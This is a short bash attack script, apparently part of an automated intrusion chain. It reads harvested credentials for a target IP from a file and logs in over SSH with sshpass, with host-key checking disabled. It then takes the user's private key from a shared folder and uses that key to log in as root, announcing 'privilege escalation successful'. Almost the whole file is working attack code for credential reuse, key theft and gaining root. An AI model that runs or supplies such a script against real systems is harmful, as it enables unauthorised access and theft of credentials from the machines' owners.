#!/bin/bash
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi
TARGET_IP="$1"
CREDENTIALS_FILE="/home/attacks/found_credentials_$TARGET_IP.txt"
#TARGET_USER="user"
PRIVATE_KEY_PATH="/home/attacks/id_rsa_$TARGET_IP"
#PASSWORD="password123"


# Check if credentials file exists
if [ ! -f "$CREDENTIALS_FILE" ]; then
    echo "Error: Credentials file not found at $CREDENTIALS_FILE. Exiting."
    exit 1
fi

# Extract the first valid username and password from the credentials file
CREDENTIAL=$(head -n 1 "$CREDENTIALS_FILE")
if [ -z "$CREDENTIAL" ]; then
    echo "Error: No credentials found in $CREDENTIALS_FILE. Exiting."
    exit 1
fi

# Parse username and password
TARGET_USER=$(echo "$CREDENTIAL" | awk -F ',' '{print $2}')
PASSWORD=$(echo "$CREDENTIAL" | awk -F ',' '{print $3}')
# find private key
if ! sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no ${TARGET_USER}@${TARGET_IP} "cat /home/${TARGET_USER}/shared/id_rsa" > "$PRIVATE_KEY_PATH"; then
    echo "Error: Unable to retrieve the private key. Incorrect password or connection issue. Exiting."
    exit 1
fi
#
chmod 600 "$PRIVATE_KEY_PATH"

# privilege escalation
ssh -i "$PRIVATE_KEY_PATH" -o StrictHostKeyChecking=no root@${TARGET_IP} "echo '[+] Privilege escalation successful'; exit"
